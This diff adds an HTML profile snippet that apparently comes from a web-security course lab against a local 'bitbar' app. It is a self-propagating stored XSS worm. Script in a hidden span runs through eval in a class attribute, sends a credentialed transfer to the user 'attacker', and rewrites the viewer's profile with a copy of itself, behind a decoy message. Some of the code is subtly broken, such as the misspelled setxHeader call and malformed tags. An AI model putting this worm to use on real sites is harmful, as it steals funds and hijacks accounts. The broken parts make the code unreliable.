@@ -1,0 +1,29 @@
+<--html-->
+<--head-->
+<--/head-->
+<--body-->
+
+<span id="hax-wrap">
+<span id="bitbar_count" class="eval(document['getElementById']('hax')['innerHTML'])"></span>
+<span id="hax">
+document.getElementById('hax').style.display = "none";
+setTimeout(function(){
+  var x = new XMLHttpRequest();
+  x.open("POST", "http://localhost:3000/post_transfer", true);
+  x.setxHeader("Content-type","application/x-www-form-urlencoded");
+  x.withCredentials = true;
+  x.send("quantity=1&destination_username=attacker");
+  x = new XMLHttpRequest();
+  x.open("POST", "http://localhost:3000/set_profile", true);
+  x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+  x.withCredentials = true;
+  x.send("new_profile=".concat(escape(document.getElementById('hax-wrap').outerHTML)));
+}, 0);
+10;
+</span>
+<p>Este es un Mensaje xD</p>
+</span>
+
+
+<--/body-->
+<--/html-->
